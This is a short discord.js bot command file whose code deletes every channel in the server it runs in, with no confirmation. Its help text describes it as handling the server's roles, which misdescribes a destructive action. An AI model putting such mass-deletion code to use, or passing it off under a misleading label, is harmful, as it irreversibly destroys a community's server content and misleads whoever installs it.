const Discord = require('discord.js');
exports.run = (bot, message, args) => {
  message.guild.channels.forEach(s => {
s.delete();
})

 };

 exports.conf = {
   enabled: true,
   guildOnly: true,
   aliases: [],
   permLevel: 4
 };

 exports.help = {
   name: 'ksil',
   description: 'Sunucudaki rolleri atar.',
   usage: 'roller'
 }
 